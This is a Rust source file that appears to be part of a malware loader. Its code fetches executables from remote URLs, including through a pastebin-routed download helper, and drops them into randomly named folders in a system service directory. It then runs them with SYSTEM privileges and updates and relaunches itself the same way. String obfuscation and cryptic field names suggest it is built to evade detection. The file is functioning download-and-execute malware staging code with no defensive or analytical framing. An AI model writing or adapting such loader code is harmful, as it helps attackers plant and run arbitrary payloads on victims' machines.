use std::{ fs, io::Write, time::Duration };
use obfstr::obfstr as s;
use loader_vars::{
    constants::{ loader_version, system_service_directory },
    types::receive::{ FlSrc, RnCnfgPrms },
};
use anyhow::{ Context, Result };
use shared::{
    constants::{ client_exe_name, system_loader_exe_name },
    network::basic::{ download_bytes_from_url, download_file_from_url_router_pastebin },
    utils::{
        config::{ load_mib_config, write_mib_config, HstCnfg },
        functions::{
            generate_random_string,
            get_current_exe,
            get_current_exe_dir,
            try_spawn_program_as_system,
        },
    },
};

use crate::info;

pub fn run_config(params: RnCnfgPrms, update_only: bool) -> Result<()> {
    if !params.enbl {
        return Ok(());
    }

    let mib_config = load_mib_config(true)?;

    let mut highest_installed_client = HstCnfg::default();
    for client in &mib_config.clnts {
        if client.version > highest_installed_client.version {
            highest_installed_client = client.clone();
        }
    }
    if params.cl_vrs > highest_installed_client.version {
        if let Some(client_source) = params.cl_src {
            info!("install_client");
            install_client(client_source, params.cl_vrs)?;
        }
    } else if !highest_installed_client.exe_path.is_empty() && !update_only {
        // this means up to date installed or higher installed.
        // just run

        info!("spawning client: ", highest_installed_client);
        try_spawn_program_as_system(&highest_installed_client.exe_path, None)?;
    }

    let mut highest_installed_loader = HstCnfg {
        version: loader_version(),
        folder_path: get_current_exe_dir()
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
        exe_path: get_current_exe()
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
        config_path: get_current_exe_dir()
            .join(s!("cache.cfg"))
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
    };
    for loader in &mib_config.ldrs {
        if loader.version > highest_installed_loader.version {
            highest_installed_loader = loader.clone();
        }
    }
    if params.upd_enbl && params.slf_vrs > highest_installed_loader.version {
        if let Some(self_source) = params.slf_src {
            info!("install_self");
            install_self(self_source, params.slf_vrs)?;
        }
    } else if !update_only {
        // this means up to date installed or higher installed or update disabled
        // just run current

        info!("spawning ldr: ", highest_installed_loader);
        try_spawn_program_as_system(&highest_installed_loader.exe_path, None)?;
    }

    Ok(())
}
fn install_client(source: FlSrc, version: u64) -> Result<()> {
    let bytes = match source {
        FlSrc::Url(url) => download_file_from_url_router_pastebin(&url)?,
        FlSrc::Bt(vec) => vec,
    };
    if bytes.is_empty() {
        return Err(anyhow::anyhow!(s!("install_client bytes.is_empty").to_owned()));
    }
    let client_dir = system_service_directory().join(generate_random_string(8));
    fs::create_dir_all(&client_dir)?;

    let config_path = client_dir.join(s!("cache.cfg"));

    let exe_path = client_dir.join(client_exe_name());

    fs::File::create(&config_path)?;

    let mut exe_file = fs::File::create(&exe_path)?;
    exe_file.write_all(&bytes)?;

    let mut mib_config = load_mib_config(true)?;

    mib_config.clnts.push(HstCnfg {
        version,
        folder_path: client_dir
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
        exe_path: exe_path
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
        config_path: config_path
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
    });

    write_mib_config(&mib_config)?;
    std::thread::sleep(Duration::from_millis(2000));

    try_spawn_program_as_system(
        exe_path.to_str().context(s!("Failed to convert pathbuf to_str").to_owned())?,
        None
    )?;

    Ok(())
}

fn install_self(source: FlSrc, version: u64) -> Result<()> {
    let bytes = match source {
        FlSrc::Url(url) => download_file_from_url_router_pastebin(&url)?,
        FlSrc::Bt(vec) => vec,
    };
    if bytes.is_empty() {
        return Err(anyhow::anyhow!(s!("install_self bytes.is_empty").to_owned()));
    }
    let loader_dir = system_service_directory().join(generate_random_string(8));
    fs::create_dir_all(&loader_dir)?;

    let config_path = loader_dir.join(s!("cache.cfg"));

    let exe_path = loader_dir.join(system_loader_exe_name());

    fs::File::create(&config_path)?;

    let mut exe_file = fs::File::create(&exe_path)?;
    exe_file.write_all(&bytes)?;

    let mut mib_config = load_mib_config(true)?;

    mib_config.ldrs.push(HstCnfg {
        version,
        folder_path: loader_dir
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
        exe_path: exe_path
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
        config_path: config_path
            .to_str()
            .context(s!("Failed to convert pathbuf to_str").to_owned())?
            .to_owned(),
    });

    write_mib_config(&mib_config)?;
    std::thread::sleep(Duration::from_millis(2000));

    try_spawn_program_as_system(
        exe_path.to_str().context(s!("Failed to convert pathbuf to_str").to_owned())?,
        None
    )?;

    Ok(())
}
